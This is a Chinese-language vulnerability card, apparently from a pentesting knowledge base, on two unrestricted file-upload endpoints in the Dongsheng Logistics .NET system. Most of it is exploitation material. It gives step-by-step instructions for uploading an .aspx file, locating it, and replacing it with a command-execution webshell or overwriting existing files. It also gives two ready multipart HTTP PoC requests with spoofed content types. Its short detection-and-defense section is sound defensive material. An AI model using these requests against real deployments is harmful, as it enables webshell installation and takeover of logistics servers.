---
id: web-generic-file-upload-dongsheng-logistics-extension-no-check
title: 东胜物流两处任意文件上传：FileInputHandler/Upload 与 MsWl_HaierMain/File 均不做扩展名白名单
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-unrestricted-extension-upload-webroot
aliases:
- 东胜物流任意文件上传
- FileInputHandler Upload
- MsWl_HaierMain File
- ACCDATE 上传
- aspx 上传 getshell
tags:
- file-upload
- dotnet
- aspnet
- mvc
- iis
- aspx
- webshell
- unrestricted-upload
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T23:16:18+08:00'
  notes: 已对照原文与12张图核对：FileInputHandlerController.Upload遍历Request.Files、仅Path.GetExtension、relativepath=../../UploadFiles/Fileupload/yyyyMM、时间戳+随机数+ext、File.Delete+SaveAs；MsWl_HaierMainController.File要求file+ACCDATE、path=../../UploadFiles/Bs、Path.GetFileName后usercode+时间戳+原文件名、先删后SaveAs，均与截图一致。核对发现原标题“只保留原始扩展名”不准确（入口二保留完整原始文件名），已改为“均不做扩展名白名单”；上传目录IIS解析未实测、confidence medium 已在卡内注明
---

## 一句话结论

东胜物流系统的 `FileInputHandlerController.Upload` 与 `MsWl_HaierMainController.File` 两个上传入口只从客户端文件名取扩展名或原始文件名，没有扩展名白名单/黑名单、也没有内容类型或魔数校验，文件被写入站点下的 `UploadFiles/Fileupload/<yyyyMM>` 与 `UploadFiles/Bs`；上传 `.aspx`/`.ashx`/`.asmx` 等 IIS 可解析类型即可落盘 webshell（是否可执行取决于上传目录的 IIS 配置，未实测）。

## 原理

- 入口一 `FileInputHandlerController : Controller` 的 `[HttpPost] JsonResult Upload()`：遍历 `base.Request.Files`，对每个 `HttpPostedFileBase` 只检查非空和 `ContentLength > 0`；`relativepath = "../../UploadFiles/Fileupload/" + DateTime.Now.ToString("yyyyMM")`，`path = base.Server.MapPath(relativepath)`；随后 `string extension = Path.GetExtension(uploadFile.FileName)`，`filepath = "\\" + DateTime.Now.ToString("yyyyMMddHHmmssfff") + new Random().Next(100, 999) + extension`，`path += filepath`，同名先 `File.Delete` 再 `uploadFile.SaveAs(path)`，最后把 `relativepath + filepath` 加入 JSON 响应。
- 入口二 `MsWl_HaierMainController.File()` 的 `[HttpPost] ContentResult File()`：要求 `Request.Files.Count == 1`，取 `HttpPostedFileBase file = base.Request.Files["file"]`，并从表单读取 `ACCDATE`（任意日期字符串即可通过）；`path = base.Server.MapPath("../../UploadFiles/Bs")`，`name = Path.GetFileName(file.FileName)`，`usercode = CookieConfig.GetCookie_UserCode(base.Request)`，`filename = path + "\\" + usercode + DateTime.Now.ToString("yyyyMMddHHmmssfff") + name`，`File.Exists` 时先删除，再 `file.SaveAs(filename)`。
- 为什么成立：`Path.GetExtension` 返回的完全由客户端 `filename="..."` 决定，代码没有把它与白名单比较；两个保存路径都以 `Server.MapPath("../../UploadFiles/...")` 相对当前请求目录解析，`../../` 落回应用根附近，文件在站点目录内可被 Web 访问。IIS 默认把 `.aspx`、`.ashx`、`.asmx` 映射给 ASP.NET 处理器，请求上传文件即编译执行其中的服务端代码，进程身份为应用池账户。
- 入口二虽然用 `Path.GetFileName` 去掉了文件名中的目录部分，避免通过文件名做路径穿越，但保留了扩展名，任意类型上传的核心问题仍在；入口一的文件名主体被时间戳+随机数替换，同样只保留扩展名。
- 危害：上传最小 `.aspx` 内容（如 `<% Response.Write("ok"); %>`）即可验证解析；若上传目录被配置为禁止脚本执行或位于站点外，则退化为任意文件写入/覆盖，需结合其他点利用。

## 触发条件

- 目标部署东胜物流系统，`FileInputHandler/Upload` 与/或 `MsWl_HaierMain/File` 可达；入口是否需登录未验证（代码片段中未见鉴权检查，`CookieConfig.GetCookie_UserCode` 只用于命名）。
- 应用池账户对 `UploadFiles/Fileupload`、`UploadFiles/Bs` 目录有写权限。
- 上传目录位于 IIS 站点内，且 IIS 未禁止对上传扩展名的脚本解析（默认 `.aspx` 可解析）。
- 入口二还需提供 `ACCDATE` 表单字段，值可为任意可解析日期。

## 利用步骤

1. 入口一：构造 multipart POST 到 `/FileInputHandler/Upload`，字段名任意（代码遍历 `Request.Files`），文件名设为 `x.aspx`，内容为最小 webshell。
2. 从 JSON 响应读取 `data` 中的落盘路径（形如 `../../UploadFiles/Fileupload/202511/20251123120000123.aspx`），按站点根换算为可访问 URL。
3. 入口二：POST 到 `/MsWl_HaierMain/File`，表单包含 `ACCDATE=2025-11-23`，文件字段名必须为 `file`，文件名 `x.aspx`。
4. 访问上传后的 `.aspx` 路径；若返回内容被执行，则将内容替换为命令执行/文件管理 webshell。
5. 若 `.aspx` 被拦截，按目标 IIS 配置尝试 `.ashx`、`.asmx`、`.config` 等可解析/可覆盖类型；或上传同名文件覆盖已有文件（两处代码都存在先删后写逻辑）。

## PoC

> 以下请求路径与落盘 URL 按代码和默认路由推断，未给出实测上传/访问响应；需按目标实际站点结构调整。

```http
### 入口一：FileInputHandler/Upload
POST /FileInputHandler/Upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="x.aspx"
Content-Type: image/png

<%@ Page Language="C#" %><% Response.Write("ok"); %>
------x--
```

```http
### 入口二：MsWl_HaierMain/File
POST /MsWl_HaierMain/File HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="ACCDATE"

2025-11-23
------x
Content-Disposition: form-data; name="file"; filename="x.aspx"
Content-Type: image/png

<%@ Page Language="C#" %><% Response.Write("ok"); %>
------x--
```

```text
# 入口一响应示例（字段名与格式按代码推断）
{"success":true,"data":["../../UploadFiles/Fileupload/202511/20251123120000123.aspx"]}

# 入口二落盘文件名 = usercode + yyyyMMddHHmmssfff + 原文件名
# 访问 http://target/UploadFiles/Bs/<usercode><timestamp>x.aspx
```

## 变体与关联

- 同一系统还有多处任意文件上传；审计时搜 `SaveAs`、`Path.GetExtension`、`Request.Files`、`Server.MapPath`。
- 与 [[web-generic-file-upload-extension-zero-check]] 同类（扩展名零校验直接落盘），本例给出 .NET MVC 双入口与具体命名规则。
- 与 [[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]] 同类：.NET 上传接口只取原始后缀并写入站点目录；可复用其 aspx 验证 payload 与覆盖逻辑。
- 入口二的 `ACCDATE` 只用于业务校验，不参与路径或文件名安全控制，不能作为防护。

## 检测与防御

- 扩展名白名单（只允许业务需要的图片/文档类型），并用服务端生成的随机名 + 固定安全后缀，不保留客户端扩展名。
- 校验 `Content-Type` 与文件魔数；图片重编码后再落盘；拒绝双扩展名/大小写/尾点等变体。
- 上传目录移出站点根，或对 `UploadFiles` 配置 `<location>` 禁止脚本处理器（`<handlers><remove .../></handlers>` + `requestFiltering` 拒绝脚本扩展名），只允许静态文件。
- 上传接口加登录/权限校验；文件名不使用用户可控部分，`Path.GetFileName` 之后仍要扩展名白名单。
- 检测：Web 日志中出现对 `UploadFiles/*.aspx|ashx|asmx` 的 POST/GET；文件系统监控上传目录新增脚本扩展名；IIS 日志中上传后紧接同路径请求。
